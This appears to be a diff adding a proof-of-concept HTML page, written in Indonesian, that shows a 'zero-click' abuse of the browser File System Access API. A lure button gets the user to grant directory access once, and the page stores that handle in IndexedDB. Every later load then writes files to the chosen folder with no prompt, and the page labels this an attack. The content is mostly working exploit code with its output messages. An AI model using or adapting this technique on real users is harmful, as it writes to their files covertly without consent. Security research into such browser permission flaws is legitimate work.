@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Zero-Click FSA PoC</title>
+</head>
+<body>
+  <h1>🔄 Memeriksa akses...</h1>
+  <script>
+    (async () => {
+      const DB_NAME = 'FSA_ZERO_CLICK';
+      const STORE = 'handles';
+      const KEY = 'desktop';
+
+      // Buka IndexedDB
+      const openDB = () => new Promise((resolve, reject) => {
+        const req = indexedDB.open(DB_NAME, 1);
+        req.onupgradeneeded = e => e.target.result.createObjectStore(STORE);
+        req.onsuccess = () => resolve(req.result);
+        req.onerror = () => reject(req.error);
+      });
+
+      // Ambil handle
+      const getHandle = async (db) => {
+        return new Promise((resolve, reject) => {
+          const tx = db.transaction(STORE, 'readonly');
+          const req = tx.objectStore(STORE).get(KEY);
+          req.onsuccess = () => resolve(req.result);
+          req.onerror = () => reject(req.error);
+        });
+      };
+
+      try {
+        const db = await openDB();
+        const dirHandle = await getHandle(db);
+
+        if (!dirHandle) {
+          // Fase 1: Belum ada izin → minta (tapi ini butuh klik)
+          document.body.innerHTML = `
+            <button id="init">📁 Simpan Data ke Desktop (Sekali Saja)</button>
+            <p style="color:gray">Setelah ini, semua aksi otomatis.</p>
+          `;
+          document.getElementById('init').addEventListener('click', async () => {
+            const newHandle = await window.showDirectoryPicker({ mode: 'readwrite' });
+            const tx = db.transaction(STORE, 'readwrite');
+            tx.objectStore(STORE).put(newHandle, KEY);
+            alert('✅ Izin disimpan! Reload halaman ini untuk zero-click write.');
+          });
+          return;
+        }
+
+        // 🔥 FASE 2: ZERO-CLICK WRITE! 🔥
+        const filename = `zero_click_${Date.now()}.txt`;
+        const fileHandle = await dirHandle.getFileHandle(filename, { create: true });
+        const writer = await fileHandle.createWritable();
+        await writer.write(
+          `[AUTOMATIC] File ini dibuat TANPA INTERAKSI.\n` +
+          `Waktu: ${new Date().toISOString()}\n` +
+          `Serangan: Zero-click setelah persistensi.`
+        );
+        await writer.close();
+
+        document.body.innerHTML = `
+          <h2>🎯 SUKSES ZERO-CLICK!</h2>
+          <p>File <code>${filename}</code> muncul di Desktop.</p>
+          <p>Tidak ada dialog. Tidak ada klik. Ini berjalan otomatis.</p>
+        `;
+        console.log(`✅ Zero-click write: ${filename}`);
+
+      } catch (err) {
+        if (err.name !== 'AbortError') {
+          console.error('💥 Error:', err);
+          document.body.innerHTML = `<p>❌ Gagal: ${err.message}</p>`;
+        }
+      }
+    })();
+  </script>
+</body>
+</html>
